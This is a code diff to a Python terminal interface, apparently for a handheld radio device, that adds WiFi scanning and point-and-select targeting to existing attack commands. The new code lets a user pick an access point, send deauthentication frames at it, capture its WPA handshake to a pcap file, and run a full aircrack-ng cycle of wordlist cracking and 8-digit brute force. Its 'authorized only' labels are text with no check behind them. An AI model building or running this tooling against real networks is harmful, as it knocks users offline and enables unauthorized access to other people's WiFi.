@@ -15,8 +15,10 @@ Smart console (single input box):
                          (kind: telemetry|wifi|nrf|rf; survives a dropped link)
   :crack <pcap> [wl]     crack a local WPA handshake pcap by wordlist
   :crackdev <remote>[wl] fetch a device handshake pcap then crack it
-  :deauth <bssid>[ch][n] inject deauth frames at an AP (authorized use only)
-  :attack <ssid>[wl][brute] full cycle via aircrack-ng; brute=add 8-digit brute
+  :scan [secs]           scan WiFi (Ctrl+S); pick a row, then act on it
+  :deauth [bssid][ch][n] deauth (defaults to the selected AP) — authorized only
+  :handshake / :hs       capture the selected AP's 4-way handshake (deauth+cap)
+  :attack [ssid][wl][brute] full cycle via aircrack-ng (defaults to selected AP)
   :wordlists             list discovered wordlists + available crackers
 Keys: ctrl+r refresh status · ctrl+l clear log · ctrl+q quit
 """
@@ -27,7 +29,7 @@ import argparse
 from textual import work
 from textual.app import App, ComposeResult
 from textual.containers import Horizontal, Vertical
-from textual.widgets import Header, Footer, Input, RichLog, Static, Tree
+from textual.widgets import Header, Footer, Input, RichLog, Static, Tree, DataTable
 
 from companion_proto import Companion
 import companion_commands as cc
@@ -42,6 +44,7 @@ class CompanionTUI(App):
     #devinfo { color: $success; height: auto; }
     #status { color: $accent; height: auto; margin-bottom: 1; }
     #cmds { height: 1fr; border: round $primary; }
+    #aps { height: 40%; border: round $accent; }
     #log { border: round $primary; }
     #cmd { dock: bottom; }
     """
@@ -49,6 +52,7 @@ class CompanionTUI(App):
         ("ctrl+q", "quit", "Quit"),
         ("ctrl+r", "refresh", "Status"),
         ("ctrl+l", "clear", "Clear log"),
+        ("ctrl+s", "scan", "Scan WiFi"),
     ]
 
     def __init__(self, port: str, token: str = "", transport: str = "usb", name: str = "Bruc"):
@@ -64,6 +68,9 @@ class CompanionTUI(App):
         self.last_caps = ""
         self.last_status = ""
         self.last_cmd_result = None  # (ok, code, lines) — for headless testing
+        self._aps = []               # last WiFi scan results
+        self._target = None          # currently selected AP dict
+        self._last_pcap = ""         # last captured handshake pcap
 
     def compose(self) -> ComposeResult:
         yield Header(show_clock=True)
@@ -73,14 +80,52 @@ class CompanionTUI(App):
                 yield Static("", id="status")
                 yield Tree("Functions", id="cmds")
             with Vertical():
+                yield DataTable(id="aps")
                 yield RichLog(id="log", highlight=True, markup=True, wrap=True)
                 yield Input(placeholder="pick a function ↖ or type a command…", id="cmd")
         yield Footer()
 
     def on_mount(self) -> None:
         self.query_one("#log", RichLog).write("[dim]opening %s…[/dim]" % self.port)
+        tbl = self.query_one("#aps", DataTable)
+        tbl.cursor_type = "row"
+        tbl.add_columns("SSID", "BSSID", "ch", "RSSI", "enc")
+        tbl.border_title = "WiFi — Ctrl+S to scan, then act on the selected row"
         self._build_tree()
         self.connect()
+
+    def action_scan(self) -> None:
+        self.scan()
+
+    @work(exclusive=True, group="dev")
+    async def scan(self, secs: float = 6.0) -> None:
+        if not self.dev:
+            self.write_log("[red]not connected[/red]")
+            return
+        self.write_log(f"[yellow]scanning WiFi {secs:.0f}s…[/yellow]")
+        aps = await asyncio.to_thread(self.dev.scan_aps, secs)
+        self._aps = aps
+        tbl = self.query_one("#aps", DataTable)
+        tbl.clear()
+        for ap in aps:
+            tbl.add_row(ap["ssid"] or "<hidden>", ap["bssid"], str(ap["ch"]),
+                        str(ap["rssi"]), ap["enc"])
+        self.write_log(f"[green]found {len(aps)} APs[/green] — select a row, then :deauth / :capture / :attack")
+        if aps:
+            self._target = aps[0]
+
+    def on_data_table_row_highlighted(self, event) -> None:
+        if 0 <= event.cursor_row < len(self._aps):
+            self._target = self._aps[event.cursor_row]
+            ap = self._target
+            self.query_one("#aps", DataTable).border_title = (
+                f"target: {ap['ssid'] or '<hidden>'} [{ap['bssid']}] "
+                f"ch{ap['ch']} {ap['rssi']}dBm")
+
+    def _require_target(self):
+        if not self._target:
+            self.write_log("[red]no target — Ctrl+S to scan and select a network[/red]")
+        return self._target
 
     def _build_tree(self) -> None:
         tree = self.query_one("#cmds", Tree)
@@ -252,17 +297,44 @@ class CompanionTUI(App):
                     return
                 await self._crack_local(parts[1], parts[2] if len(parts) > 2 else "")
                 return
-            if text.startswith(":deauth"):
-                # :deauth <bssid> [ch] [count]
+            if text.startswith(":scan"):
                 parts = text.split()
-                if len(parts) < 2:
-                    self.write_log("[red]usage: :deauth <bssid> [ch] [count][/red]")
-                    return
-                ch = int(parts[2]) if len(parts) > 2 else 0
-                cnt = int(parts[3]) if len(parts) > 3 else 16
-                self.write_log(f"[yellow]deauth[/yellow] {parts[1]} ch={ch} ×{cnt} …")
-                r = await asyncio.to_thread(self.dev.deauth, parts[1], "broadcast", ch, cnt)
+                secs = float(parts[1]) if len(parts) > 1 else 6.0
+                self.scan(secs)
+                return
+            if text.startswith(":deauth"):
+                # :deauth [bssid] [ch] [count]  — bssid defaults to the selected AP
+                parts = text.split()
+                if len(parts) >= 2:
+                    bssid, ch = parts[1], (int(parts[2]) if len(parts) > 2 else 0)
+                    cnt = int(parts[3]) if len(parts) > 3 else 16
+                else:
+                    t = self._require_target()
+                    if not t:
+                        return
+                    bssid, ch, cnt = t["bssid"], t["ch"], 24
+                self.write_log(f"[yellow]deauth[/yellow] {bssid} ch={ch} ×{cnt} …")
+                r = await asyncio.to_thread(self.dev.deauth, bssid, "broadcast", ch, cnt)
                 self.write_log("  " + " ".join(r.lines))
+                return
+            if text.startswith(":handshake") or text.startswith(":hs"):
+                # capture the 4-way handshake of the selected AP (deauth + capture)
+                t = self._require_target()
+                if not t:
+                    return
+                os.makedirs(DL_DIR, exist_ok=True)
+                local = os.path.join(DL_DIR, "hs_%s.pcap" % t["bssid"].replace(":", ""))
+                self.write_log(f"[yellow]capture handshake[/yellow] {t['ssid'] or t['bssid']} "
+                               f"ch{t['ch']} (deauth)…")
+                cap = await asyncio.to_thread(self.dev.capture_handshake, t["bssid"], t["ch"],
+                                              25.0, 24, 4, local)
+                import wpa_crack as wcm
+                tg, _ = wcm.select_target(cap["local"], t["ssid"])
+                if tg:
+                    self.write_log(f"[green]✓ handshake[/green] {tg.label()} -> {cap['local']}")
+                    self._last_pcap = cap["local"]
+                else:
+                    self.write_log(f"[red]✗ no EAPOL[/red] ({cap.get('samples')} frames) — retry")
                 return
             if text.startswith(":wordlists") or text.startswith(":tools"):
                 import crackers as ck
@@ -272,13 +344,16 @@ class CompanionTUI(App):
                     self.write_log(f"  {lbl}  [dim]{p}[/dim]")
                 return
             if text.startswith(":attack"):
-                # :attack <ssid> [wordlist] [brute]  — full cycle via aircrack-ng
+                # :attack [ssid] [wordlist] [brute] — ssid defaults to the selected AP;
+                # full cycle (find→deauth→capture→crack→brute) via aircrack-ng
                 parts = text.split()
-                if len(parts) < 2:
-                    self.write_log("[red]usage: :attack <ssid> [wordlist] [brute][/red]")
-                    return
-                await self._attack(parts[1], parts[2] if len(parts) > 2 else "",
-                                   parts[3] if len(parts) > 3 else "")
+                if len(parts) >= 2:
+                    await self._attack(parts[1], parts[2] if len(parts) > 2 else "",
+                                       parts[3] if len(parts) > 3 else "")
+                else:
+                    t = self._require_target()
+                    if t:
+                        await self._attack(t["ssid"], "", "")
                 return
             if text.startswith(":ls"):
                 text = "ls " + (text[3:].strip() or "/")
